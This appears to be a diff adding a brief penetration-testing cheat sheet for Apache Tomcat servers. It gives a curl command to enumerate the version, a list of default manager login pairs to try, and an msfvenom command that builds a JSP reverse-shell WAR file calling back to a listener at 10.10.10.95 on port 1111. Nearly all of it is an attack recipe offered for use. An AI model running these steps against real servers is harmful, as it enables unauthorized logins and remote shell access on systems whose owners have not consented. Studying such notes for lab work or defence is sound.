@@ -1,0 +1,18 @@
+Tomcat Server 
+
+Enumerate for version
+
+curl -s http://tomcat-site.local:8080/docs/ | grep Tomcat 
+
+Default Credentials
+
+admin:admin
+tomcat:tomcat
+admin:s3cr3t
+tomcat:s3cr3t
+admin:tomcat
+admin:<NOTHING>
+
+WAR
+	
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.95 LPORT=1111 -f war > shell.war
